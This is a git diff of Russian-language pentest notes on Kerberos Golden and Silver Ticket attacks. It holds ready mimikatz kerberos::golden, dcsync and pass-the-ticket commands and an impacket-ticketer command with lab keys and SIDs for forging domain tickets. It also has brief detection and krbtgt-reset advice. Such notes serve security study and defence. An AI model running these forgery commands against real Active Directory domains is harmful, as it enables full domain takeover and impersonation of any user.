@@ -2,7 +2,7 @@
 
 > Необходим для получении сессии любого пользователя
 
-Если у пользователя есть хэш специальной учетки krbtgt, то его хэшем подписываютсяабсолютно все TGT
+Если у пользователя есть хэш специальной учетки krbtgt, то его хэшем подписываются абсолютно все TGT
 
 - TGT зашифрован секретом krbtgt
 - TGS зашифрован секретом учетной записи из-под которой работает аккаунт
@@ -27,13 +27,32 @@ lsadump::dcsync /user:<blabla>\krbtgt
 ```
 
 1.1) Выпуск Golden Ticket
-```mimikatz
-kerberos::golden /user:idyachkov /domain:testlab.esc /sid:S-1-5-21-1129291328-2819992169-918366777  /krbtgt:d55b37f6d892bb4ad68655b217e0af80 /id:1110 /groups:513 /ticket:idyachkov.testlab.esc
+```powershell
+kerberos::golden 
+/user:idyachkov 
+/domain:testlab.esc 
+/sid:S-1-5-21-1129291328-2819992169-918366777  /aes256:1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc
+/id:1110 # Не обязательно
+/groups:513 
+/ticket:idyachkov.testlab.esc
+/endin:600 # общее время жизни (мин)
+/renewmax:10080 # срок, когда билет нужно продлевать (мин)
 ```
 
 1.2) Выпуск Silver Ticket
-```mimikatz
-kerberos::golden /user:idyachkov /domain:testlab.esc /sid:S-1-5-21-1129291328-2819992169-918366777 /target:DC01.testlab.esc /service:CIFS /rc4:d55b37f6d892bb4ad68655b217e0af80 /id:1110 /groups:513 /ticket:idyachkov_silver.kirbi
+```powershell
+kerberos::golden 
+/user:idyachkov 
+/domain:testlab.esc 
+/sid:S-1-5-21-1129291328-2819992169-918366777 
+/target:DC01.testlab.esc 
+/service:CIFS 
+/aes256:1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc
+/id:1110 # Не обязательно
+/groups:513 
+/ticket:idyachkov_silver.kirbi
+/endin:600 # общее время жизни (мин)
+/renewmax:10080 # срок, когда билет нужно продлевать (мин)
 ```
 
  Популярные службы для Silver Tickets
@@ -52,6 +71,16 @@ kerberos::golden /user:idyachkov /domain:testlab.esc /sid:S-1-5-21-1129291328-28
 kerberos::ptt <ticket>
 ```
 
+
+## Через Impacket-tickiter
+```bash
+sudo impacket-ticketer \
+-nthash <krbtgt_hash>  \
+-domain <domain> \ 
+-domain-sid <sid>  \
+FakeAdmin
+```
+
 ## Detect attack
 
 Event ID
@@ -60,5 +89,6 @@ Event ID
 
 При атаке Golden Ticket мы не запрашиваем TGT у DC, а генерируем его самостоятельно
 
-
-
+Необходимо изменять хэш krbtgt 2 раз с интервалом в 10 часов
+Для безопасного сброса использовать этот скрипт
+[New-KrbtgtKeys.ps1](github.com/microsoftarchive/New-KrbtgtKeys.ps1)
